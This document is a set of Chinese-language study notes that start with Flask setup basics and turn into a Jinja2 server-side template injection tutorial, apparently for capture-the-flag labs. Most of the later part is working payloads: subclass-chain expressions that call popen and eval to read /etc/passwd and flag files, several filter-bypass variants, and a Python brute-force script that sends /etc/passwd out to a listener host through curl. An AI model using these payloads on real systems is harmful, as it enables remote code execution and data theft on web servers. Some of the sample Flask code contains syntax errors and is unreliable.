# ,python venv环境安装

`cd /opt/flask1`

`source ./bin/activate`

#运行完发现命令行前面多了个(flask)

`deactivate`          #退出虚拟环境

# flask

flask是一个使用python编写的轻量级Web应用框架

模板引擎使用Jinja2

`vim demo.py`       内容如下

```
from flask import Flask
app = Flask(__name__)

@app.route('/')
def hello():
	return "hello,ggbo"
	
if __name__='__main__':
	app.run()
```

`app = Flask(__name__)`是获取名字,内部运行时name==main,外部运行时name等于python文件的文件名

`if __name__='__main__':
	app.run()`

就是只有内部运行时才会执行

`python3 demo.py`

只能在虚拟机中内部访问

把最后一行代码改为

`app.run(host='0.0.0.0')`

可以在物理主机上也访问

如果改为:

`app.run(debug=True,host='0.0.0.0')`

#调试程序的时候可以用,当配置修改的时候,会重启服务,成熟的产品不可以用它

也可以在app.run()中加port=来指定端口,但是换端口之后debug无法自动更改端口,需要重启服务



# flask变量及方法

demo.py

```
from flask import Flask
app = Flask(__name__)

@app.route('/aaa/<name>')
def hello(name):
	return "hello,%s" % name
	
if __name__='__main__':
	app.run()
```

`<name>`表示传入的参数,访问url是加上/aaa/ggbo就会显示

hello,ggbo

```
from flask import Flask
app = Flask(__name__)

@app.route('/aaa/<name>')
def hello(name):
	return "hello,%s" % name

@app.route('/int/<int:postID>')
def id(postID)
	return " %d " % postID
	
if __name__='__main__':
	app.run()
```

只接受整型的常量

## Flask HTTP方法

示例代码:

```
@app.route('/login',methods = ['POST','GET'])
def login():
	if request.method == 'POST':
		print(1)
		user = request.form['ben']
		return redirect(url_for('success',name = user))         #redirect重定向到/success/user
	else:
		print(2)
		user = request.args.get('ben')
		return redirect(url_for('success',name = user))
```



# Flask模板

## 视图函数

主要作用:生成请求的响应

处理业务逻辑>>>返回相应内容

把业务逻辑和表现内容放在一起,会增加代码复杂度和维护成本



**使用模板:**使用静态的页面html展示动态的内容(运算和数据分开)

模板是一个相应文本的文件,其中占用符(变量)表示动态部分,告诉模板引擎器具体的值需要从数据中获取

使用真实值替换白能量,在返回最终得到的字符串,这个过程称为**"渲染"**

Flask使用Jinja2模板引擎来进行渲染



## render_template

加载html文件,默认文件路径在templates下

![image-20240416234353046](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240416234353046.png)

## render_template_string

用于渲染html字符串,直接定义内容

![image-20240416234416626](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240416234416626.png)



# 模板注入漏洞

## Flask漏洞

成因:

渲染模板时,没有严格控制对用户的输入

可能造成任意文件读取和RCE远程控制后台系统

 ![image-20240417170044693](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240417170044693.png)



![image-20240417170219297](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240417170219297.png)



## SSTI

![image-20240417170348678](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240417170348678.png)



# 继承关系和魔术方法

![image-20240417171115920](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240417171115920.png)

![image-20240417171831466](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240417171831466.png)

也可以使用:

`print(c.__class__.__mro__)`   #直接显示上面的所有类

`print(c.__class__.__mro__[1].__subclasses__())`

#找到B类下面的所有类(数组形式)

`print(c.__class__.__mro__[1].__subclasses__()[1])`

#调用D



## 魔术方法

`__class_`:查找当前类型的所属对象

`__base__`:沿着父子类往上找一个类

`__mro__`:查找当前类上面的所有类

`__subclasses__()`:查找所有子类

`__init__`:查看类是否重载

`__globals__`:函数会以字典的形式返回当前对象的全部全局变量

`{{''.__class__.__base__.__subclasses__()[117].__init__.__globals__['popen']('cat /etc/passwd').read()}}`



# 常用注入模块

## 文件读取

### 寻找子类`_frozen_importlib_external.FileLoader`

使用**ssti脚本.py**

- 要先找到object路径

![image-20240422110612517](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240422110612517.png)

文件读取payload:

`name={{''.__class__.__base__.__subclasses__()[79]["get_data"](0,"/flag")}}`

读取配置文件下的flag:

`{{url_for.__globals__['current_app'].config.flag}}`

`{get_flashed_messages.__globals__['current_app'].config.flag}}`

### 内建eval函数执行命令

使用**ssti寻找eval函数.py**

![image-20240422130436945](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240422130436945.png)

`name={{''.__class__.__base__.__subclasses__()[64].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("cat /etc/passwd").read()')}}`

对于`__import__("os").popen("cat /etc/passwd").read()`这段代码,chatgpt解释如下:

1. `__import__("os")`: 这是一种动态导入模块的方式。`__import__()` 是 Python 中的一个内置函数，它允许在运行时动态导入模块。在这里，它动态地导入了 `os` 模块。
2. `.popen("cat /etc/passwd")`: 一旦 `os` 模块被导入，`.popen()` 方法可以被调用。这个方法用于执行系统命令，并返回一个文件对象，该对象可以用于读取命令的输出。在这里，`"cat /etc/passwd"` 是要执行的系统命令，它将读取系统中的 `/etc/passwd` 文件。
3. `.read()`: 一旦 `popen` 方法返回一个文件对象，`.read()` 方法被调用以读取命令的输出。它将返回命令执行的结果。



## os模块执行命令

### 通过config,url_for调用os模块

`{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}`

`{{url_for.__globals__.os.popen('cat /etc/passwd').read()}}`

`{{lipsum.__globals__.os.popen('cat /etc/passwd').read()}}`

### 在已经加载os模块的子类里直接调用os模块

![image-20240422125151116](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240422125151116.png)

`{{''.__class__.__base__.__subclasses__()[422].__init__.__globals__.os.popen('id').read()}}`



## importlib类执行命令

![image-20240422130751678](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240422130751678.png)

![image-20240422130826808](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240422130826808.png)



## linecache函数执行命令

![image-20240422130910765](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240422130910765.png)

具体payload:

![image-20240422130928943](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240422130928943.png)



## subprocess.Popen类执行命令

![image-20240422131003672](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240422131003672.png)

具体payload:

![image-20240422131024671](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240422131024671.png)





![image-20240422131041534](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240422131041534.png)

**具体数值用python脚本查找**



# 绕过双大括号过滤

## {%%}使用

![image-20240423103317262](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240423103317262.png)



![image-20240423103433412](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240423103433412.png)



![image-20240423103706681](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240423103706681.png)

如果`''.__class__.__base__`有内容,则条件为真,返回benben

先查询到object类,object下面globals下面有popen子类

![image-20240423103913504](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240423103913504.png)

脚本运行结果:

`117 ---> {'code': "{% if ().__class__.__base__.__subclasses__()[117].__init__.__globals__['popen']('cat /etc/passwd').read() %}benben{% endif %}"}`



payload:

`{% print(''.__class__.__base__.__subclasses__()[117].__init__.__globals__['popen']('cat /etc/passwd').read()) %}`



# 无回显ssti注入

## 反弹注入

- 通过rce反弹一个shell界面

![image-20240423111311681](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240423111311681.png)



## 带外注入

![image-20240423111326111](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240423111326111.png)

先在kali上开启一个python http监听也可以用dnslog

```
import requests
url =input('请输入URL链接:')
for i in range(500):
    data = {"code":"{% if ().__class__.__base__.__subclasses__()["+str(i)+"].__init__.__globals__['popen']('curl http://172.21.205.184/`cat /etc/passwd`').read() %}benben{% endif %}"}
    #name替换成题目中给的post方式提交的键值
    try:
        response = requests.post(url,data=data)
        #print(response.text)
        if response.status_code == 200:
            if'benben' in response.text:
                print(i,"--->",data)
                break
    except:
        pass
```



## 纯盲注

![image-20240423111133591](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240423111133591.png)



# 绕过过滤中括号

![image-20240423111609157](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240423111609157.png)

实例:

`code={{''.__class__.__base__.__subclasses__().__getitem__(117)}}`

等价于

`code={{''.__class__.__base__.__subclasses__()[117]}}`

最终payload:

`code={{''.__class__.__base__.__subclasses__().__getitem__(117).__init__.__globals__.__getitem__('popen')('cat /flag').read()}}`



# 绕过单双引号过滤

![image-20240423113217953](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240423113217953.png)

![image-20240423113605950](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240423113605950.png)



payload:

`code={{().__class__.__base__.__subclasses__()[117].__init__.__globals__[request.args.k1](request.args.k2).read()}}`

再通过GET方式提交

`http://172.21.205.184:18080/flasklab/level/5?k1=popen&k2=cat /flag`



# 过滤器绕过下划线过滤

![image-20240423114447370](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240423114447370.png)

 

`{{ users|length}}`

使用attr()来进行绕过



payload:

`code={{''|attr(request.args.k1)|attr(request.args.k2)|attr(request.args.k3)()|attr(request.args.k4)(117)|attr(request.args.k5)|attr(request.args.k6)|attr(request.args.k4)('popen')('cat /flag')|attr('read')()  }}`

再使用GET传参:

`?k1=__class__&k2=__base__&k3=__subclasses__&k4=__getitem__&k5=__init__&k6=__globals__`